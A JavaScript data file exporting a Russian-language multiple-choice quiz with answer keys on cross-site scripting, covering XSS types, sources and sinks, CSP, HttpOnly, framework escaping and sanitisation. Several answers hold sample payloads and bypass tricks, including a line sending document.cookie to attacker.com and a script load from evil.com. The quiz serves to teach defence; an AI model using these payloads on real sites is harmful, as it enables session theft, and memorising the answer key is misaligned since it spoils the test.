export const quizQuestions = [
    {
        question: "Что означает аббревиатура XSS?",
        answers: [
            "Cross-Site Scripting",
            "Extra Safe Style",
            "XML System Security",
            "Xenon Server System"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Почему XSS сокращают как XSS, а не CSS?",
        answers: [
            "Чтобы не путать с Cascading Style Sheets",
            "Это просто традиция",
            "X звучит круче",
            "Это опечатка"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой код обычно внедряется при XSS атаке?",
        answers: [
            "JavaScript",
            "C++",
            "Python",
            "Java"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Где выполняется вредоносный код при XSS?",
        answers: [
            "В браузере жертвы",
            "На сервере",
            "В базе данных",
            "На роутере"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое Reflected XSS?",
        answers: [
            "Когда вредоносный скрипт отражается от веб-сервера (например, в сообщении об ошибке или результатах поиска) и выполняется сразу",
            "Когда скрипт хранится в БД",
            "Когда скрипт в DOM",
            "Когда скрипт в картинке"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое Stored XSS?",
        answers: [
            "Когда вредоносный скрипт сохраняется на сервере (в БД, файле) и выполняется каждый раз при просмотре страницы",
            "Когда скрипт в ссылке",
            "Когда скрипт в email",
            "Когда скрипт удаляется"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое DOM-based XSS?",
        answers: [
            "Уязвимость, возникающая в клиентском коде (JS), когда данные из небезопасного источника (Source) попадают в опасную функцию (Sink)",
            "Это XSS в домене",
            "Это серверная ошибка",
            "Это ошибка базы данных"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "К какому типу относится XSS, если пейлоад находится в URL и выполняется при переходе по ссылке?",
        answers: [
            "Reflected XSS",
            "Stored XSS",
            "Self XSS",
            "Server XSS"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "К какому типу относится XSS, если пейлоад сохранен в комментарии на форуме?",
        answers: [
            "Stored XSS",
            "Reflected XSS",
            "DOM XSS",
            "Client XSS"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Source' в контексте DOM XSS?",
        answers: [
            "Свойство JavaScript, которое может содержать данные, контролируемые злоумышленником (location.search, document.referrer)",
            "Исходный код",
            "Источник питания",
            "Кнопка"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Sink' в контексте DOM XSS?",
        answers: [
            "Функция или объект DOM, который позволяет выполнить код или вывести HTML (innerHTML, eval, document.write)",
            "Раковина",
            "Ошибка",
            "Лог"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Является ли 'innerHTML' опасным sink?",
        answers: [
            "Да, если в него передаются непроверенные данные",
            "Нет, он безопасен",
            "Только в IE",
            "Только в Chrome"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Безопасно ли использовать 'innerText' для вывода пользовательского ввода?",
        answers: [
            "В целом да, так как он интерпретирует содержимое как текст, а не HTML",
            "Нет, это опасно",
            "Только если данные зашифрованы",
            "Только для чисел"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой самый распространенный способ доказать наличие XSS (PoC)?",
        answers: [
            "<script>alert(1)</script>",
            "rm -rf /",
            "shutdown",
            "console.log('hello')"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Blind XSS'?",
        answers: [
            "Разновидность Stored XSS, когда злоумышленник не видит результат выполнения скрипта сразу (например, в админке)",
            "Слепая печать",
            "Невидимый скрипт",
            "Атака на слепых"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Для чего часто используют XSS атаку?",
        answers: [
            "Для кражи Session Cookies (Session Hijacking)",
            "Для майнинга",
            "Для DDoS",
            "Все перечисленное"
        ],
        correctAnswerIndex: 3
    },
    {
        question: "Как злоумышленник может украсть куки через XSS?",
        answers: [
            "document.location='http://attacker.com/?cookie='+document.cookie",
            "document.deleteCookie()",
            "Через CSS",
            "Через HTML"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой флаг HttpOnly у Cookie помогает защитить от кражи через XSS?",
        answers: [
            "HttpOnly запрещает доступ к куки через JavaScript (document.cookie)",
            "Secure",
            "SameSite",
            "Domain"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Защищает ли HttpOnly от выполнения XSS?",
        answers: [
            "Нет, он только предотвращает чтение куки, но скрипт все равно может выполнять действия от имени пользователя",
            "Да, полностью",
            "Только в Firefox",
            "Только в Safari"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое CSP?",
        answers: [
            "Content Security Policy — заголовок HTTP, позволяющий ограничить источники загрузки скриптов и других ресурсов",
            "Common Security Protocol",
            "Cyber Security Plan",
            "Code Safety Policy"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как CSP помогает от XSS?",
        answers: [
            "Запрещая выполнение inline-скриптов и загрузку скриптов с чужих доменов",
            "Шифруя скрипты",
            "Удаляя скрипты",
            "Блокируя IP хакера"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Self-XSS'?",
        answers: [
            "XSS, которая работает только если пользователь сам введет пейлоад (социальная инженерия: 'вставьте это в консоль')",
            "XSS на себя",
            "Автоматический XSS",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Является ли Self-XSS уязвимостью?",
        answers: [
            "Обычно не считается высокой угрозой, так как требует действий жертвы",
            "Да, критической",
            "Нет, это фича",
            "Зависит от браузера"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Context' при эксплуатации XSS?",
        answers: [
            "Место в HTML коде, куда попадают данные (тело тега, атрибут, JS блок). От этого зависит вектор атаки",
            "Контекстная реклама",
            "Смысл текста",
            "Дизайн сайта"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как эксплуатировать XSS внутри атрибута value=\"...\"?",
        answers: [
            "Закрыть кавычку и атрибут: \"> <script>...",
            "Просто написать <script>",
            "Использовать пробелы",
            "Нельзя"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как защититься от XSS при выводе данных в HTML?",
        answers: [
            "Использовать HTML Entity Encoding (& < > \" ' -> &amp; &lt; &gt; ...)",
            "Удалить все пробелы",
            "Использовать Base64",
            "Ничего не делать"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Polyglot XSS vector'?",
        answers: [
            "Строка, которая срабатывает как XSS во многих контекстах сразу",
            "Многоязычный скрипт",
            "Вектор графики",
            "Сложный пароль"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой инструмент популярен для эксплуатации XSS (фреймворк)?",
        answers: [
            "BeEF (Browser Exploitation Framework)",
            "Metasploit",
            "Nmap",
            "Wireshark"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Keylogger' на JS?",
        answers: [
            "Скрипт, который перехватывает нажатия клавиш и отправляет их злоумышленнику",
            "Логирование ключей",
            "Пароль от логов",
            "Музыкальный инструмент"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли через XSS сканировать локальную сеть жертвы?",
        answers: [
            "Да, используя JS для отправки запросов на внутренние IP (192.168.x.x) и анализируя время ответа",
            "Нет, браузер запрещает",
            "Только если есть Java",
            "Только в IE"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'XSS onmouseover'?",
        answers: [
            "Вектор атаки через событие мыши: <img src=x onmouseover=alert(1)>",
            "Атака на мышку",
            "Скрипт поверх окна",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'XSS onerror'?",
        answers: [
            "Вектор атаки через обработчик ошибки загрузки ресурса: <img src=x onerror=alert(1)>",
            "Ошибка скрипта",
            "Синий экран",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой атрибут HTML5 ввел 'sandbox' для защиты iframe?",
        answers: [
            "sandbox",
            "security",
            "protect",
            "guard"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли выполнить XSS через CSS?",
        answers: [
            "В старых браузерах (IE) через expression(), в современных сложнее, но возможно через exfiltration данных",
            "Нет, никогда",
            "Да, всегда",
            "Только в Firefox"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Mutation XSS' (mXSS)?",
        answers: [
            "Атака, когда браузер изменяет (мутирует) некорректный HTML, превращая безопасный текст в исполняемый скрипт",
            "XSS мутантов",
            "Генетический алгоритм",
            "Биологическая атака"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Relative Path Overwrite' (RPO) и связь с XSS?",
        answers: [
            "Техника, заставляющая браузер загрузить HTML страницу как CSS/JS файл, что может привести к XSS",
            "Перезапись пути",
            "Удаление пути",
            "Нет связи"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой заголовок включал XSS фильтр в старых браузерах?",
        answers: [
            "X-XSS-Protection",
            "X-Security",
            "Content-Filter",
            "No-Script"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Почему сейчас рекомендуют отключать X-XSS-Protection (значение 0)?",
        answers: [
            "Потому что он создавал новые уязвимости (XS-Leak) и иногда блокировал легитимный код. Лучше использовать CSP",
            "Он устарел",
            "Он замедляет работу",
            "Браузеры удалили его"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Dangling markup injection'?",
        answers: [
            "Техника кражи данных со страницы, когда внедряется незакрытый тег (например <img src='...), поглощающий часть разметки",
            "Висячая разметка",
            "Лишний код",
            "Ошибка верстки"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Script Gadgets'?",
        answers: [
            "Легитимные фрагменты JS кода в библиотеках/фреймворках, которые можно использовать для обхода XSS фильтров или CSP",
            "Гаджеты скриптов",
            "Инструменты хакера",
            "Плагины браузера"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли загрузить внешний скрипт при XSS?",
        answers: [
            "Да, <script src='http://evil.com/xss.js'></script>",
            "Нет, только inline",
            "Только с того же домена",
            "Только по HTTPS"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'JavaScript Pseudo-protocol'?",
        answers: [
            "javascript:alert(1) в ссылке (<a href=...>) или iframe src",
            "Фейковый протокол",
            "Новый стандарт",
            "Ошибка протокола"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Безопасен ли React по умолчанию от XSS?",
        answers: [
            "Да, React автоматически экранирует данные в JSX. Но есть опасные методы вроде dangerouslySetInnerHTML",
            "Нет, React опасен",
            "Зависит от версии",
            "Только Angular безопасен"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что делает dangerouslySetInnerHTML в React?",
        answers: [
            "Позволяет вставить сырой HTML (аналог innerHTML). Это потенциальный вектор XSS",
            "Делает код безопасным",
            "Удаляет HTML",
            "Шифрует данные"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'AngularJS Sandbox Escape'?",
        answers: [
            "Техники обхода песочницы в старых версиях AngularJS (1.x) для выполнения произвольного кода через выражения",
            "Побег из песочницы",
            "Игра в песок",
            "Удаление Angular"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как Vue.js защищает от XSS?",
        answers: [
            "Аналогично React, экранирует вывод {{ }}. Опасная директива - v-html",
            "Не защищает",
            "Использует WAF",
            "Удаляет JS"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Markdown XSS'?",
        answers: [
            "Внедрение XSS через синтаксис Markdown (например, [link](javascript:alert(1)))",
            "XSS в блокноте",
            "Разметка текста",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как SVG файлы могут содержать XSS?",
        answers: [
            "SVG - это XML, он поддерживает тег <script> и события (onload)",
            "В пикселях",
            "В имени файла",
            "SVG безопасен"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли получить RCE через XSS?",
        answers: [
            "Напрямую нет (код в браузере), но косвенно да (например, через эксплуатацию браузера, админки или Electron приложений)",
            "Да, всегда",
            "Нет, никогда",
            "Только в Linux"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'XSS Auditor'?",
        answers: [
            "Компонент браузеров (Chrome, Safari), пытавшийся блокировать Reflected XSS. Был удален из-за проблем",
            "Аудитор кода",
            "Человек проверяющий XSS",
            "Программа сканирования"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Для чего при XSS используют <sVg/oNlOad=alert(1)> (смешанный регистр)?",
        answers: [
            "Для обхода простых фильтров, проверяющих только <script> или lowercase",
            "Для красоты",
            "Это ошибка",
            "Так требует стандарт"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'BASE tag hijacking'?",
        answers: [
            "Внедрение тега <base href='...'>, который меняет базовый URL для всех относительных ссылок и скриптов на странице",
            "Захват базы",
            "Кража данных",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'DOMPurify'?",
        answers: [
            "Популярная JS библиотека для санитизации HTML и защиты от DOM XSS",
            "Очистка дома",
            "Средство для мытья",
            "Антивирус"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Чем отличается encodeURI от encodeURIComponent?",
        answers: [
            "encodeURIComponent кодирует больше спецсимволов (включая / ? & =), что важно для безопасности параметров",
            "Ничем",
            "Длиной названия",
            "Скоростью работы"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что будет, если вставить <script> в содержимое тега <textarea>?",
        answers: [
            "Скрипт не выполнится, он отобразится как текст внутри textarea",
            "Скрипт выполнится",
            "Браузер зависнет",
            "Ничего не будет"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что будет, если вставить <script> в содержимое тега <title>?",
        answers: [
            "Скрипт не выполнится, он станет заголовком вкладки",
            "Скрипт выполнится",
            "Страница закроется",
            "Ничего не будет"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли выполнить XSS через загрузку имени файла?",
        answers: [
            "Да, если имя файла отображается на странице без фильтрации",
            "Нет, имена файлов безопасны",
            "Только в Windows",
            "Только в Linux"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Blind XSS' охотник (Blind XSS Hunter)?",
        answers: [
            "Сервис (как XSS Hunter), который предоставляет пейлоады и собирает отчеты (скриншоты, DOM) при срабатывании Blind XSS",
            "Охотник на хакеров",
            "Игра",
            "Антивирус"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как проверить XSS в заголовке User-Agent?",
        answers: [
            "Заменить User-Agent на пейлоад (через Burp/Curl) и ждать, если он отобразится в логах админки или на сайте",
            "Нельзя",
            "Только через браузер",
            "Это безопасно"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Referer XSS'?",
        answers: [
            "XSS через заголовок Referer. Срабатывает, если сайт отображает 'Вы пришли с ...' без фильтрации",
            "Ссылка на друга",
            "Реферальная программа",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Cookie XSS'?",
        answers: [
            "Если приложение берет значение из Cookie и выводит его на страницу без фильтрации",
            "Печенье с скриптом",
            "Вкусный XSS",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой символ часто используют для 'выхода' из JS строки?",
        answers: [
            "Одинарная или двойная кавычка (' или \")",
            "Точка",
            "Запятая",
            "Пробел"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что делает функция alert(document.domain)?",
        answers: [
            "Показывает текущий домен. Используется для доказательства XSS и контекста выполнения",
            "Показывает IP",
            "Показывает пароль",
            "Ничего"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Same-Origin Policy' (SOP)?",
        answers: [
            "Политика безопасности браузера, запрещающая скриптам с одного источника (Origin) читать данные с другого",
            "Политика одного окна",
            "Политика паролей",
            "Защита от копирования"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Позволяет ли XSS обойти SOP?",
        answers: [
            "Да, так как внедренный скрипт выполняется в контексте (Origin) уязвимого сайта",
            "Нет, SOP нельзя обойти",
            "Иногда",
            "Только в IE"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'CORS' и связь с XSS?",
        answers: [
            "Cross-Origin Resource Sharing. Неправильный CORS может помочь эксплуатировать XSS (читать ответы с API)",
            "Курс валют",
            "Корсар",
            "Нет связи"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Flash XSS'?",
        answers: [
            "XSS уязвимости в Adobe Flash файлах (.swf). Сейчас редкость, так как Flash умер",
            "Быстрый XSS",
            "XSS фонарик",
            "Молния"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'PDF XSS'?",
        answers: [
            "Выполнение JS внутри PDF документа",
            "XSS при печати",
            "XSS в книге",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли получить XSS через вставку видео (YouTube)?",
        answers: [
            "Да, если сайт некорректно обрабатывает embed код или oEmbed ответы",
            "Нет, видео безопасно",
            "Только звук",
            "Только картинка"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Short XSS'?",
        answers: [
            "XSS с очень коротким пейлоадом (из-за ограничения длины поля). Например <script/src=//Ǌ.co>",
            "Короткое замыкание",
            "Маленький шрифт",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Protobuf XSS'?",
        answers: [
            "XSS при десериализации/обработке Protobuf данных на клиенте",
            "Протокол буфера",
            "Быстрый буфер",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как WAF определяет XSS?",
        answers: [
            "По сигнатурам (известным паттернам атак) и эвристике",
            "По запаху",
            "По цвету",
            "Гадает"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как обойти фильтр пробелов в XSS?",
        answers: [
            "Использовать слэш / (например <img/src=x>)",
            "Использовать точку",
            "Использовать запятую",
            "Нельзя"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Null Byte Injection' в контексте XSS?",
        answers: [
            "Использование %00 для обхода фильтров расширений или обрезки строки",
            "Нулевой пациент",
            "Стирание данных",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Response splitting'?",
        answers: [
            "Внедрение CRLF символов для разделения HTTP ответа. Может вести к XSS",
            "Разделение личности",
            "Разделение экрана",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли эксплуатировать XSS через JSON?",
        answers: [
            "Да, если JSON ответ имеет Content-Type text/html или вставляется в DOM без санитизации",
            "Нет, JSON безопасен",
            "Только XML",
            "Только YAML"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'MIME Sniffing' XSS?",
        answers: [
            "Когда браузер угадывает тип контента и исполняет файл как HTML (например, картинку с кодом), игнорируя заголовки",
            "Нюхач",
            "Поиск мин",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой заголовок защищает от MIME Sniffing?",
        answers: [
            "X-Content-Type-Options: nosniff",
            "No-Sniff",
            "Secure-MIME",
            "Content-Guard"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'DOM Clobbering'?",
        answers: [
            "Техника перезаписи глобальных переменных JS через HTML элементы с id или name. Может вести к XSS",
            "Избиение DOM",
            "Клонирование DOM",
            "Удаление DOM"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Tabnabbing'?",
        answers: [
            "Фишинговая атака с подменой содержимого неактивной вкладки (через target=_blank). Связано с window.opener",
            "Набивание табака",
            "Управление вкладками",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как защититься от Tabnabbing (и утечки window.opener)?",
        answers: [
            "rel=\"noopener noreferrer\" для ссылок с target=\"_blank\"",
            "Не использовать ссылки",
            "target=\"_self\"",
            "Никак"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Reverse Tabnabbing'?",
        answers: [
            "Аналогично, но атака идет со страницы, на которую перешли",
            "Обратный отсчет",
            "Реверс инжиниринг",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли сделать XSS через 'data:' URI?",
        answers: [
            "Да, например <a href='data:text/html;base64,...'>. Браузеры ограничивают это в top-level navigation",
            "Нет",
            "Только картинки",
            "Только звук"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'VBScript XSS'?",
        answers: [
            "XSS, использующий VBScript. Работало только в старых IE (Internet Explorer)",
            "Скрипт на VB",
            "Новый JS",
            "Вирус"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Expression Language Injection' (в контексте клиентского JS)?",
        answers: [
            "Внедрение шаблонов (например Angular {{...}}) которые исполняются фреймворком",
            "Инъекция эмоций",
            "Язык жестов",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Source Code Disclosure' через XSS?",
        answers: [
            "Иногда через XSS можно прочитать содержимое скриптов или страниц через XHR/Fetch",
            "Раскрытие исходников",
            "Открытый код",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Network Scanning' через XSS?",
        answers: [
            "Сканирование портов локальной сети пользователя (localhost, 192.168.1.1) через JS тайминги",
            "Сканирование Wi-Fi",
            "Сканнер сети",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Может ли XSS работать в мобильном приложении?",
        answers: [
            "Да, если используется WebView (компонент браузера внутри приложения)",
            "Нет",
            "Только на Android",
            "Только на iOS"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Electron XSS'?",
        answers: [
            "XSS в приложении на Electron. Если nodeIntegration включен, это ведет к RCE (полный доступ к системе)",
            "Электронный XSS",
            "XSS на электричестве",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Нужно ли исправлять XSS в админке?",
        answers: [
            "Да, так как админа можно заманить по ссылке (Reflected) или атаковать через Stored XSS",
            "Нет, админам можно доверять",
            "Админы не ходят по ссылкам",
            "Это не критично"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Parameter Pollution' для XSS?",
        answers: [
            "Использование дубликатов параметров для обхода WAF или фильтров XSS",
            "Грязные параметры",
            "Загрязнение воды",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Unicode Normalization' и XSS?",
        answers: [
            "Нормализация символов (например, 'fullwidth' символов) может превратить безопасный текст в опасный тег <script> после проверки фильтром",
            "Нормальные коды",
            "Стандарт Unicode",
            "Нет связи"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как проверить XSS в upload functionality?",
        answers: [
            "Загрузить HTML/SVG/XML файл с скриптом и попробовать открыть его напрямую",
            "Загрузить exe",
            "Загрузить картинку",
            "Нельзя"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой статус у XSS в OWASP Top 10 (2021)?",
        answers: [
            "Входит в категорию A03: Injection",
            "A01: Broken Access Control",
            "A07: Identification and Authentication Failures",
            "Больше не в топе"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Dangling Markup'?",
        answers: [
            "Техника экстракции данных, когда незакрытый тег (н-р img src=) захватывает часть страницы до следующей кавычки",
            "Висячая разметка",
            "Лишний код",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Strict-Transport-Security' (HSTS) и XSS?",
        answers: [
            "HSTS заставляет использовать HTTPS. Не защищает от XSS напрямую, но защищает куки от перехвата в открытой сети (MITM), что дополняет защиту",
            "Транспортная безопасность",
            "Защита перевозок",
            "Нет связи"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Feature Policy' (Permissions Policy)?",
        answers: [
            "Позволяет отключать опасные фичи браузера (камера, микрофон, геолокация), снижая импакт от XSS",
            "Политика фич",
            "Разрешения",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что главное в поиске XSS?",
        answers: [
            "Понять, как данные попадают в приложение и как они выводятся (Data Flow Analysis)",
            "Использовать сканер",
            "Писать alert(1) везде",
            "Угадывать"
        ],
        correctAnswerIndex: 0
    }
];
